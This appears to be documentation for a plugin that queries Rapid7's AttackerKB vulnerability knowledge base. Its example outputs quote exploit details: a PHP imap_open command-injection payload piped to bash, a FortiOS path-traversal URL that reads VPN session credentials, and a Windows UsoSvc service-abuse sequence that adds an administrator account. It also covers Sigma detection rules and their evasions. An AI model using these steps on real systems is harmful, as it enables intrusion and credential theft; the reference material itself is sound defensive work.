# Description

[Rapid7's AttackerKB](http://attackerkb.com/) is a knowledge base of vulnerabilities and informed opinions on what makes them valuable (or not) targets for exploitation

# Key Features

* Search for vulnerabilities
* Obtain vulnerability assessment information

# Requirements

* Requires an API Key

# Documentation

## Setup

The connection configuration accepts the following parameters:

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|credentials|credential_secret_key|None|True|API key from account e.g. YYDHZKByMaDTMmY4ZC12MmUxLTkyTTBtY2UxUzkxNjbbYWI2OMzLYjATHjABZ9x3MUhyVUEzMWF1N0E5QThDOEhsQTRrMW1GVDZWUGVaDnA9|None|YYDHZKByMaDTMmY4ZC12MmUxLTkyTTBtY2UxUzkxNjbbYWI2OMzLYjATHjABZ9x3MUhyVUEzMWF1N0E5QThDOEhsQTRrMW1GVDZWUGVaDnA9|
|max_pages|integer|100|False|Max pages returned, default 100|None|10|

Example input:

```
{
  "credentials": {
    "secretKey": "YYDHZKByMaDTMmY4ZC12MmUxLTkyTTBtY2UxUzkxNjbbYWI2OMzLYjATHjABZ9x3MUhyVUEzMWF1N0E5QThDOEhsQTRrMW1GVDZWUGVaDnA9"
  },
  "max_pages": 100
}
```

## Technical Details

### Actions

#### Get Assessment

This action is used to return a single assessment with the specified ID.

##### Input

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|id|string|None|True|The UUID of a specific assessment to return|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|

Example input:

```
{
  "id": "a2c54f3d-48d0-48c4-b056-3a78181d777c"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|assessment|False|Returned assessment data|

Example output:

```
{
  "data": {
    "created": "2020-03-25T00:59:58.868978Z",
    "document": "The `imap_open` function within php, if called without the `/norsh` flag, will attempt to preauthenticate an IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's `ProxyCommand` option can be passed from imap_open to execute arbitrary commands.\r\nThe execution flow of this, on Debian systems is as such:\r\n\r\n1. PHP `imap_open` via `rsh`\r\n2. `rsh` aliased to `ssh`\r\n3. SSH's `ProxyCommand` RCE\r\n\r\nThere were some other nuances, such as not allowing spaces (`$IFS$()` is OK).  Typical execution of this at the SSH side was to base64 encode the payload and pipe it to bash: ```\"-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`\"```.\r\n\r\nThe trick is finding where a webapp calls the `imap_open` functionality.  Typically this is in a higher privileged part of the webapp, since it could be destructive (such as disabling notifications).  Some webapps seem to include the function call, but never call the function which uses it (maybe there for plugins to use?).",
    "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
    "id": "b550e76b-5c86-412e-a2a9-937b075f5b96",
    "metadata": {
      "attacker-value": 2,
      "exploitability": 3
    },
    "revisionDate": "2020-03-25T00:59:58.872884Z",
    "score": 1,
    "topicId": "35cb145f-3b4b-4c42-b848-f9cc0cf6a503"
  }
}
```

#### Search Assessments

This action is used to return all assessments.

##### Input

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|created|string|None|False|Return all assessments that were created on the given date, eg. 2019-07-04|None|2019-07-04|
|document|string|None|False|Text to query the document parameter. A substring match is performed, eg. RDP|None|RDP|
|editorId|string|None|False|The UUID of a contributor|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|
|id|string|None|False|The UUID of a specific assessment to return|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|
|page|integer|0|False|Pagination page number, default value is 0|None|0|
|revisionDate|string|None|False|Return all assessments that were last edited on the given date, eg. 2019-07-04|None|2019-07-04|
|size|integer|10|False|The number of assessments returned per page, default value is 10|None|10|
|topicId|string|None|False|The UUID of the topic this assessment was based on|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|

Example input:

```
{
  "document": "VPN"
}
```

Example input (search by id):

```
{
  "id": "47f78818-b766-47ca-8262-d7abc8dced66"
}
```

Example input (search by editorId):

```
{
  "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|[]assessment|False|Returned assessment data|

Example output:

```
{
  "data": [
    {
      "created": "2020-03-25T20:04:57.831425Z",
      "document": "\r\n**Description**\r\n\r\nDue to a pre-authenticated Path Trasversal vulnerability under the SSL VPN portal on FortiOS, an attacker is able to pull arbitrary system files from the file system. One of the most critical files which an attacker may pull is \"sslvpn_websessions\" which contains session information including usernames and password.\r\n\r\nOnce the attacker has obtained the credentials from this file, he can authenticated with those credentials, compromising the corporate perimeter.\r\n\r\n**Mitigation**\r\n\r\n- Upgrade to FortiOS 5.4.13, 5.6.8, 6.0.5 or 6.2.0 and above.\r\n- Enable 2FA. Note the attacker will not be able to log in to the VPN, but the obtained credentials are still valid (potencial domain creds) to access corporate mail, etc.\r\n\r\n**Affected Systems**\r\n\r\n- FortiOS 6.0: 6.0.0 to 6.0.4\r\n- FortiOS 5.6: 5.6.3 to 5.6.7\r\n- FortiOS 5.4: 5.4.6 to 5.4.12\r\n\r\nNOTE: Only if the SSL VPN service (web-mode or tunnel-mode) is enabled.\r\n\r\n**PoC**\r\n\r\nThere are some public working exploits for this vulnerability, targeting the \"sslvpn_websessions\" system file.\r\n\r\nAn attacker would access the following URL:\r\n- https://\u003cIP_ADDRESS\u003e/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\r\n\r\nAnd after some parsing to the binary file, something like the following output would be obtained:\r\n\r\n![LOGO] (https://devco.re/assets/img/blog/20190807/4.png)\r\n\r\nNOTE: Example image obtained from https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/\r\n\r\n",
      "editorId": "10bfc743-3786-435c-88e8-56e791bbc053",
      "id": "6db90257-86b5-4748-ae01-82cea24fcfdb",
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "tags": [
          "easy_to_develop",
          "pre_auth"
        ]
      },
      "revisionDate": "2020-03-25T20:04:57.835948Z",
      "score": 1,
      "topicId": "35b88369-c440-49c0-98ff-c50e258fb32c"
    },
    {
      "created": "2020-03-25T15:59:33.70864Z",
      "document": "This is an elevation of privilege vulnerability that exists when Windows improperly handles authentication requests by leveraging the Update Orchestrator Service. If an attacker successfully exploits this vulnerability they can run processes in an elevated context. \r\n\r\n\r\n**Prerequisite**:  \r\n\r\nThe Update Orchestrator Service runs as NT AUTHORITY\\SYSTEM and any user in the group NT AUTHORITY\\SERVICE have full access to modify the service.\r\n\r\nIt is known to affect Windows 10 1803 and above that have not been updated with the November 12th, 2019 security update patch (or above).\r\n \r\n\r\n**Exploitation**: \r\n\r\nCreate tmpUser, add to local administrators group, and reset the service to its default state.\r\n\r\n```sh\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"cmd /c net user /add tmpUser tmpPassword123\"\r\nsc.exe start UsoSvc\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"cmd /c net localgroup Administrators /add tmpUser\"\r\nsc.exe start UsoSvc\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"C:\\Windows\\System32\\svchost.exe -k netsvcs -p\"\r\nsc.exe start UsoSvc\r\n```",
      "editorId": "476d5018-c9fe-422d-825b-d5601af6bcf0",
      "id": "47f78818-b766-47ca-8262-d7abc8dced66",
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "tags": [
          "high_privilege_access"
        ]
      },
      "revisionDate": "2020-03-25T15:59:33.712345Z",
      "score": 1,
      "topicId": "8011789d-8681-4c89-a088-8e14d395987f"
    }
  ]
}
```

#### Get Vulnerability

This action is used to return a single topic with the specified ID.

##### Input

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|id|string|None|True|The UUID of a specific topic to return|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|

Example input:

```
{
  "id": "a2c54f3d-48d0-48c4-b056-3a78181d777c"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|topic|False|Returned topic data|

Example output:

```
{
  "data": {
    "created": "2020-06-05T20:27:27.697886Z",
    "disclosureDate": "2020-07-01T15:15:00Z",
    "document": "In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.",
    "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
    "id": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
    "metadata": {
      "baseMetricV3": {
        "cvssV3": {
          "attackComplexity": "LOW",
          "attackVector": "NETWORK",
          "availabilityImpact": "HIGH",
          "baseScore": 9.8,
          "baseSeverity": "CRITICAL",
          "confidentialityImpact": "HIGH",
          "integrityImpact": "HIGH",
          "privilegesRequired": "NONE",
          "scope": "UNCHANGED",
          "userInteraction": "NONE",
          "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "version": "3.1"
        },
        "exploitabilityScore": 3.9,
        "impactScore": 5.9
      },
      "credits": {
        "discovered-by": [
          "Mikhail Klyuchnikov"
        ],
        "module": [
          "exploit/linux/http/f5_bigip_tmui_rce"
        ]
      },
      "cveState": "PUBLIC",
      "mitigations": "2",
      "offensive-application": "exploit",
      "references": [
        "CVE-2020-5902",
        "https://blog.trendmicro.com/trendlabs-security-intelligence/mirai-botnet-exploit-weaponized-to-attack-iot-devices-via-cve-2020-5902/",
        "https://us-cert.cisa.gov/ncas/alerts/aa20-206a",
        "https://support.f5.com/csp/article/K52145254",
        "https://github.com/corelight/CVE-2020-5902-F5BigIP",
        "http://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html",
        "https://github.com/rapid7/metasploit-framework/pull/13807",
        "https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/",
        "https://otx.alienvault.com/pulse/5f282c78953c1baee1f9b01b",
        "http://packetstormsecurity.com/files/158334/BIG-IP-TMUI-Remote-Code-Execution.html"
      ],
      "shelf-life": "4",
      "userbase": "4",
      "utility-class": "rce",
      "vendor": {
        "productNames": [
          "BIG-IP"
        ]
      },
      "vulnerable-versions": [
        "BIG-IP 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, 11.6.1-11.6.5.1"
      ]
    },
    "name": "CVE-2020-5902 — TMUI RCE vulnerability",
    "rapid7Analysis": "**Description:** On July 3, F5 Networks [announced](https://twitter.com/F5Networks/status/1279022116868960257) that its BIG-IP Traffic Management User Interface (TMUI) has a remote code execution vulnerability (CVE-2020-5902) in undisclosed pages. Successful exploitation allows unauthenticated attackers, or authenticated users, with network access to the TMUI, through the BIG-IP management port and/or Self IPs, to execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code. This vulnerability may result in complete system compromise. See [F5’s advisory](https://support.f5.com/csp/article/K52145254?sf235665517=1), which was published June 30, for full details. \r\n\r\nCVE-2020-5902 carries a CVSSv3 base score of 10.0 and is [known to be actively exploited in the wild](https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/) as of July 3, 2020. Security researcher Kevin Beaumont also noted on Sunday, July 5 that BIG-IP boxes are [being targeted with automated credential scraping](https://twitter.com/GossiTheDog/status/1279856862888898568), and that organizations whose BIG-IP instances were yet to be upgraded should rotate credentials and examine log data. \r\n\r\n**Affected products include:** BIG-IP (LTM, AAM, AFM, Analytics, APM, ASM, DNS, FPS, GTM, Link Controller, PEM)\r\n\r\nKnown vulnerable versions:\r\n* 15.1.0\r\n* 15.0.0\r\n* 14.1.0 - 14.1.2\r\n* 13.1.0 - 13.1.3\r\n* 12.1.0 - 12.1.5\r\n* 11.6.1 - 11.6.5\r\n\r\nF5’s [advisory](https://support.f5.com/csp/article/K52145254?sf235665517=1) notes that “the BIG-IP system in Appliance mode is also vulnerable. This issue is not exposed on the data plane; only the control plane is affected.”\r\n\r\n**Rapid7 analysis:** BIG-IP is common in enterprise and high-value environments and makes an *extremely* attractive attack target even for vulnerabilities with higher barriers to exploitation. CVE-2020-5902 presents no such hurdle for attackers; the vulnerability is easily exploitable and straightforward to weaponize. As of July 5, Rapid7’s vulnerability research and exploit development team has tested multiple attack vectors and was able to achieve unauthenticated remote root code execution with one of them: RCE in this case results from security flaws in multiple components, such as one that allows directory traversal exploitation. Metasploit exploit code that obtains a root shell on vulnerable versions of BIG-IP is [here](https://github.com/rapid7/metasploit-framework/pull/13807).\r\n\r\nOver the weekend, the research community published a [widely shared Sigma rule](https://github.com/Neo23x0/sigma/blob/master/rules/web/web_cve_2020_5902_f5_bigip.yml) to detect exploitation. The rule is under active revision to account for and mitigate a number of different evasions. Further details are below, but in general defenders should be aware of quickly evolving information about mitigation and detection bypasses. Defenders can mitigate the risk of evasions by modifying monitoring processes to alert on unique components (e.g., `..;`, `tmui`) and setting more precise matching rules. \r\n\r\nOriginally, the Sigma rule checked for a base path, `/tmui/login`, like so:\r\n\r\n```\r\ndetection:\r\n   selection_base:\r\n       c-uri|contains: '/tmui/login'\r\n   selection_traversal:\r\n       c-uri|contains:\r\n           - '..;/'\r\n           - '.jsp/..'\r\n   condition: selection_base and selection_traversal\r\n```\r\nThis means the path must contain `/tmui/login` as a prerequisite, then either `..;/` or `.jsp/..`.  Rapid7 researchers verified as of July 7, 2020 that it was possible for attackers to circumvent the rule—for instance by modifying the login path to `/tmui/./login`, where `.` means current directory (`/tmui`). In general, path normalization works against detection rules here, i.e., in that the addition of `.` is normalized to `/tmui/login`. **As of July 8, this evasion has since been mitigated by updates to the Sigma rule.** However, Metasploit researchers have tested further evasions that, for instance, break `selection_traversal` instead of `selection_base`. Our guidance for defenders remains the same—alerting on unique components and setting precise matching rules is recommended as an overarching strategy regardless of the particulars of each new evasion.\r\n\r\n**Guidance:**\r\nF5 Networks customers running affected products should upgrade to a non-vulnerable version as quickly as possible. If you are unable to patch, F5 lists a number of mitigation options with detailed instructions in the `Security Advisory Recommended Actions` section of [their advisory](https://support.f5.com/csp/article/K52145254?sf235665517=1). In general, organizations should avoid exposing management interfaces to the public internet. \r\n\r\n**Update August 4, 2020:** [AlienVault](https://otx.alienvault.com/pulse/5f282c78953c1baee1f9b01b) and Trend Micro research has said this week that [a Mirai botnet exploit has been weaponized](https://blog.trendmicro.com/trendlabs-security-intelligence/mirai-botnet-exploit-weaponized-to-attack-iot-devices-via-cve-2020-5902/) to attack IoT devices via CVE-2020-5902. Per Trend Micro's report, \"a Mirai botnet downloader (detected by Trend Micro as Trojan.SH.MIRAI.BOI) can be added to new malware variants to scan for exposed Big-IP boxes for intrusion and deliver the malicious payload.\"\r\n\r\n**Update July 13, 2020:** Researchers have [strongly emphasized](https://twitter.com/NCCGroupInfosec/status/1280593966879125504) that patching is far preferred to applying mitigations. The [mitigation bypass](https://twitter.com/TeamAresSec/status/1280553293320781825) shared last week has been detected in the wild since at least July 7. Further information from F5 Networks is below, but organizations that were unable to patch and instead applied the mitigation should assess their systems for compromise and patch as soon as possible.\r\n\r\n**Update July 8, 2020:** The F5 Networks communication below advises BIG-IP customers who were unable to patch that their previously suggested mitigation is able to be circumvented.\r\n\r\n\"The Security Advisory for this CVE contained a suggested mitigation, for those unable to upgrade immediately, which was believed to prevent unauthenticated attackers from exploiting the vulnerability. Today F5 received new information, which indicated there was a method for attackers to circumvent the mitigation and compromise an unpatched system.\r\n\r\nA new mitigation has been developed, and an updated Security Advisory has been published: [K52145254: TMUI RCE vulnerability CVE-2020-5902](https://support.f5.com/csp/article/K52145254). F5 recommends applying this new mitigation to all systems which have not yet been upgraded to a patched release, including those systems which were previously mitigated.\"\r\n\r\nAs community reports have indicated both active exploitation of CVE-2020-5902 and automated credential scraping, BIG-IP customers should also strongly consider changing credentials and examining their logs for unusual activity. Organizations should assess whether their individual risk models warrant further incident response or other compromise investigation. \r\n",
    "revisionDate": "2020-08-04T12:35:16.686822Z",
    "score": {
      "attackerValue": 4.666666666666667,
      "exploitability": 4.8
    },
    "tags": [
      {
        "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
        "metadata": {}
      }
    ]
  }
}
```

#### Search Vulnerabilities

This action is used to return all topics.

##### Input

|Name|Type|Default|Required|Description|Enum|Example|
|----|----|-------|--------|-----------|----|-------|
|created|string|None|False|Return all topics that were created on the given date, eg. 2019-07-04|None|2019-07-04|
|disclosureDate|string|None|False|Return all topics that were disclosed on the given date, eg. 2019-07-04|None|2019-07-04|
|document|string|None|False|Text to query the document parameter. A substring match is performed, eg. RDP|None|RDP|
|editorId|string|None|False|The UUID of a contributor|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|
|id|string|None|False|The UUID of a specific topic to return|None|a2c54f3d-48d0-48c4-b056-3a78181d777c|
|name|string|None|False|Text to query the name parameter. A substring match is performed|None|CVE-2020-3789|
|page|integer|0|False|Pagination page number, default value is 0|None|0|
|revisionDate|string|None|False|Return all topics that were last edited on the given date, eg. 2019-07-04|None|2019-07-04|
|size|integer|10|False|The number of topics returned per page, default value is 10|None|10|

Example input:

```
{
  "name": "Firefox"
}
```

Example input (search by editorId):

```
{
  "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1"
}
```

Example input (search by name):

```
{
  "name": "CVE-2020-3789"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|[]topic|False|Returned topic data|

Example output:

```
{
  "data": [
    {
      "created": "2020-06-05T20:27:27.697886Z",
      "disclosureDate": "2020-07-01T15:15:00Z",
      "document": "In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "id": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "metadata": {
        "baseMetricV3": {
          "cvssV3": {
            "attackComplexity": "LOW",
            "attackVector": "NETWORK",
            "availabilityImpact": "HIGH",
            "baseScore": 9.8,
            "baseSeverity": "CRITICAL",
            "confidentialityImpact": "HIGH",
            "integrityImpact": "HIGH",
            "privilegesRequired": "NONE",
            "scope": "UNCHANGED",
            "userInteraction": "NONE",
            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "version": "3.1"
          },
          "exploitabilityScore": 3.9,
          "impactScore": 5.9
        },
        "credits": {
          "discovered-by": [
            "Mikhail Klyuchnikov"
          ],
          "module": [
            "exploit/linux/http/f5_bigip_tmui_rce"
          ]
        },
        "cveState": "PUBLIC",
        "mitigations": "2",
        "offensive-application": "exploit",
        "references": [
          "CVE-2020-5902",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/mirai-botnet-exploit-weaponized-to-attack-iot-devices-via-cve-2020-5902/",
          "https://us-cert.cisa.gov/ncas/alerts/aa20-206a",
          "https://support.f5.com/csp/article/K52145254",
          "https://github.com/corelight/CVE-2020-5902-F5BigIP",
          "http://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html",
          "https://github.com/rapid7/metasploit-framework/pull/13807",
          "https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/",
          "https://otx.alienvault.com/pulse/5f282c78953c1baee1f9b01b",
          "http://packetstormsecurity.com/files/158334/BIG-IP-TMUI-Remote-Code-Execution.html"
        ],
        "shelf-life": "4",
        "userbase": "4",
        "utility-class": "rce",
        "vendor": {
          "productNames": [
            "BIG-IP"
          ]
        },
        "vulnerable-versions": [
          "BIG-IP 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, 11.6.1-11.6.5.1"
        ]
      },
      "name": "CVE-2020-5902 — TMUI RCE vulnerability",
      "rapid7Analysis": "**Description:** On July 3, F5 Networks [announced](https://twitter.com/F5Networks/status/1279022116868960257) that its BIG-IP Traffic Management User Interface (TMUI) has a remote code execution vulnerability (CVE-2020-5902) in undisclosed pages. Successful exploitation allows unauthenticated attackers, or authenticated users, with network access to the TMUI, through the BIG-IP management port and/or Self IPs, to execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code. This vulnerability may result in complete system compromise. See [F5’s advisory](https://support.f5.com/csp/article/K52145254?sf235665517=1), which was published June 30, for full details. \r\n\r\nCVE-2020-5902 carries a CVSSv3 base score of 10.0 and is [known to be actively exploited in the wild](https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/) as of July 3, 2020. Security researcher Kevin Beaumont also noted on Sunday, July 5 that BIG-IP boxes are [being targeted with automated credential scraping](https://twitter.com/GossiTheDog/status/1279856862888898568), and that organizations whose BIG-IP instances were yet to be upgraded should rotate credentials and examine log data. \r\n\r\n**Affected products include:** BIG-IP (LTM, AAM, AFM, Analytics, APM, ASM, DNS, FPS, GTM, Link Controller, PEM)\r\n\r\nKnown vulnerable versions:\r\n* 15.1.0\r\n* 15.0.0\r\n* 14.1.0 - 14.1.2\r\n* 13.1.0 - 13.1.3\r\n* 12.1.0 - 12.1.5\r\n* 11.6.1 - 11.6.5\r\n\r\nF5’s [advisory](https://support.f5.com/csp/article/K52145254?sf235665517=1) notes that “the BIG-IP system in Appliance mode is also vulnerable. This issue is not exposed on the data plane; only the control plane is affected.”\r\n\r\n**Rapid7 analysis:** BIG-IP is common in enterprise and high-value environments and makes an *extremely* attractive attack target even for vulnerabilities with higher barriers to exploitation. CVE-2020-5902 presents no such hurdle for attackers; the vulnerability is easily exploitable and straightforward to weaponize. As of July 5, Rapid7’s vulnerability research and exploit development team has tested multiple attack vectors and was able to achieve unauthenticated remote root code execution with one of them: RCE in this case results from security flaws in multiple components, such as one that allows directory traversal exploitation. Metasploit exploit code that obtains a root shell on vulnerable versions of BIG-IP is [here](https://github.com/rapid7/metasploit-framework/pull/13807).\r\n\r\nOver the weekend, the research community published a [widely shared Sigma rule](https://github.com/Neo23x0/sigma/blob/master/rules/web/web_cve_2020_5902_f5_bigip.yml) to detect exploitation. The rule is under active revision to account for and mitigate a number of different evasions. Further details are below, but in general defenders should be aware of quickly evolving information about mitigation and detection bypasses. Defenders can mitigate the risk of evasions by modifying monitoring processes to alert on unique components (e.g., `..;`, `tmui`) and setting more precise matching rules. \r\n\r\nOriginally, the Sigma rule checked for a base path, `/tmui/login`, like so:\r\n\r\n```\r\ndetection:\r\n   selection_base:\r\n       c-uri|contains: '/tmui/login'\r\n   selection_traversal:\r\n       c-uri|contains:\r\n           - '..;/'\r\n           - '.jsp/..'\r\n   condition: selection_base and selection_traversal\r\n```\r\nThis means the path must contain `/tmui/login` as a prerequisite, then either `..;/` or `.jsp/..`.  Rapid7 researchers verified as of July 7, 2020 that it was possible for attackers to circumvent the rule—for instance by modifying the login path to `/tmui/./login`, where `.` means current directory (`/tmui`). In general, path normalization works against detection rules here, i.e., in that the addition of `.` is normalized to `/tmui/login`. **As of July 8, this evasion has since been mitigated by updates to the Sigma rule.** However, Metasploit researchers have tested further evasions that, for instance, break `selection_traversal` instead of `selection_base`. Our guidance for defenders remains the same—alerting on unique components and setting precise matching rules is recommended as an overarching strategy regardless of the particulars of each new evasion.\r\n\r\n**Guidance:**\r\nF5 Networks customers running affected products should upgrade to a non-vulnerable version as quickly as possible. If you are unable to patch, F5 lists a number of mitigation options with detailed instructions in the `Security Advisory Recommended Actions` section of [their advisory](https://support.f5.com/csp/article/K52145254?sf235665517=1). In general, organizations should avoid exposing management interfaces to the public internet. \r\n\r\n**Update August 4, 2020:** [AlienVault](https://otx.alienvault.com/pulse/5f282c78953c1baee1f9b01b) and Trend Micro research has said this week that [a Mirai botnet exploit has been weaponized](https://blog.trendmicro.com/trendlabs-security-intelligence/mirai-botnet-exploit-weaponized-to-attack-iot-devices-via-cve-2020-5902/) to attack IoT devices via CVE-2020-5902. Per Trend Micro's report, \"a Mirai botnet downloader (detected by Trend Micro as Trojan.SH.MIRAI.BOI) can be added to new malware variants to scan for exposed Big-IP boxes for intrusion and deliver the malicious payload.\"\r\n\r\n**Update July 13, 2020:** Researchers have [strongly emphasized](https://twitter.com/NCCGroupInfosec/status/1280593966879125504) that patching is far preferred to applying mitigations. The [mitigation bypass](https://twitter.com/TeamAresSec/status/1280553293320781825) shared last week has been detected in the wild since at least July 7. Further information from F5 Networks is below, but organizations that were unable to patch and instead applied the mitigation should assess their systems for compromise and patch as soon as possible.\r\n\r\n**Update July 8, 2020:** The F5 Networks communication below advises BIG-IP customers who were unable to patch that their previously suggested mitigation is able to be circumvented.\r\n\r\n\"The Security Advisory for this CVE contained a suggested mitigation, for those unable to upgrade immediately, which was believed to prevent unauthenticated attackers from exploiting the vulnerability. Today F5 received new information, which indicated there was a method for attackers to circumvent the mitigation and compromise an unpatched system.\r\n\r\nA new mitigation has been developed, and an updated Security Advisory has been published: [K52145254: TMUI RCE vulnerability CVE-2020-5902](https://support.f5.com/csp/article/K52145254). F5 recommends applying this new mitigation to all systems which have not yet been upgraded to a patched release, including those systems which were previously mitigated.\"\r\n\r\nAs community reports have indicated both active exploitation of CVE-2020-5902 and automated credential scraping, BIG-IP customers should also strongly consider changing credentials and examining their logs for unusual activity. Organizations should assess whether their individual risk models warrant further incident response or other compromise investigation. \r\n",
      "revisionDate": "2020-08-04T12:35:16.686822Z",
      "score": {
        "attackerValue": 4.666666666666667,
        "exploitability": 4.8
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb"
        }
      ]
    }
  ]
}
```

### Triggers

_This plugin does not contain any triggers._

### Custom Output Types

#### assessment

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Created|string|False|The date and time the assessment was created, eg. 2019-07-02T16:22:15.879357Z|
|Document|string|True|The main content of the assessment|
|Editor ID|string|False|The UUID of the contributor who last edited the assessment|
|ID|string|False|The UUID of the assessment|
|Metadata|object|False|A JSON value containing key/value pairs describing various attributes about this assessment|
|Revision Date|string|False|The date and time the assessment was last changed, eg. 2019-07-02T16:22:15.879357Z|
|Topic ID|string|True|The UUID of the topic this assessment is based on|

#### link

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Href|string|True|URL for paginated resource|

#### score

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Attacker Value|float|False|The attacker value score|
|Exploitability|float|False|The exploitability score|

#### tags

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Common Enterprise|float|False|The 'Common in enterprise' score|
|Default Configuration|float|False|The 'Present in default configuration' score|
|Difficult To Develop|float|False|The 'Difficult to develop' score|
|Difficult To Exploit|float|False|The 'High barrier to exploitation' score|
|Difficult To Patch|float|False|The 'Difficult to patch' score|
|Easy To Develop|float|False|The 'Easy to develop' score|
|High Privilege Access|float|False|The 'Allows high-privileged access' score|
|No Useful Data|float|False|The 'Does not produce useful data' score|
|Obscure Configuration|float|False|The 'Only present in obscure configuration' score|
|Post Auth|float|False|The 'Post-Auth' score|
|Pre Auth|float|False|The 'Pre-Auth' score|
|Requires Interaction|float|False|The 'Requires user interaction' score|

#### topic

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Created|string|False|The date and time the topic was created, eg. 2019-07-02T16:22:15.879357Z|
|Disclosure Date|string|False|The date and time the topic was disclosed, eg. 2019-07-02T16:22:15.879357Z|
|Document|string|True|The main content of the topic|
|Editor ID|string|False|The UUID of the contributor who last edited the topic|
|ID|string|False|The UUID of the topic|
|Metadata|object|False|A JSON value containing key/value pairs describing various attributes about this topic|
|Name|string|True|The name or title of the topic|
|Revision Date|string|False|The date and time the topic was last changed, eg. 2019-07-02T16:22:15.879357Z|
|Score|score|False|The topic score properties|
|Tags|tags|False|The frequencies with which various tags appear on assessments|

## Troubleshooting

_This plugin does not contain any troubleshooting information._

# Version History

* 1.0.1 - API changed for AttackerKb, add new `metadata` output type for Get Vulnerability and Search Vulnerabilities actions
* 1.0.0 - Initial plugin

# Links

## References

* [Rapid7 AttackerKB](https://attackerkb.com/)
* [Rapid7 AttackerKB API](https://api.attackerkb.com/api-docs/docs)
